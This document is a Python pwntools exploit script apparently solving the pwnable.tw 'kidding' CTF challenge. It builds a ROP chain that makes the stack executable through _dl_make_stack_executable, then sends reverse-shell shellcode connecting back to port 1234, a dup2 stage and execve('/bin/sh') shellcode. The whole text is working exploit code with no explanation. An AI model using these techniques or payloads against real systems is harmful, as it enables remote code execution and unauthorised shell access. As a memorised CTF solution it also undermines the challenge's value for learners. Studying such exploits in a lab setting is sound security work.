from pwn import *
import time

push_esp_ret                 = p32(0x080b8546)
pop_eax_ret                  = p32(0x080b8536)
pop_edx_ret                  = p32(0x0806ec8b)
mov_ptr_edx_eax_ret          = p32(0x0805462b) # 0x0805462b : mov dword ptr [edx], eax ; ret
_dl_make_stack_executable    = p32(0x0809a080)
__libc_stack_end             = p32(0x080e9fc8) # mov    ecx,DWORD PTR [eax]
__stack_prot                 = p32(0x080e9fec) # push   DWORD PTR ds:0x80e9fec

context.arch = "i386" 
#  push 0x100007f
#  push 0xb048894d
revshell_sc = '''
    xor ebx, ebx
    xor edx, edx
    push edx
    push 0x1
    push 0x2
    mov ecx, esp
    inc ebx
    mov ax, 0x66  
    int 0x80
    
    push 0x100007f
    push 0xd2040002
    mov ecx, esp
    push 0x10
    push ecx
    push eax
    mov ecx, esp
    inc ebx
    inc ebx
    mov al, 0x66   
    int 0x80
'''
sc_ret_main = '''
    push 0x0804887c
    ret
'''
dup2_sc = '''
    xor ebx, ebx
    xor ecx,ecx 
    inc ecx 
    mov eax, 0x3f
    int 0x80 

'''
payload2  = b"B" * 12
payload2 += push_esp_ret
payload2 += asm(revshell_sc)
payload2 += asm(dup2_sc)
payload2 += b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"


sh = process("./kidding")
#gdb.attach(sh)
#sh = process(["/usr/bin/strace", "/home/daniel/Desktop/kidding/kidding"])
#sh = remote("chall.pwnable.tw", "10303")

payload  = b"A" * 12

payload += pop_edx_ret
payload += __stack_prot
payload += pop_eax_ret
payload += p32(0x7)
payload += mov_ptr_edx_eax_ret
payload += pop_eax_ret
payload += __libc_stack_end
payload += _dl_make_stack_executable
payload += push_esp_ret
payload += asm(revshell_sc) + asm(sc_ret_main)

l = listen(1234)
sh.send(payload)
l2 = listen(1234)
l.send(payload2)
l.close()
l2.interactive()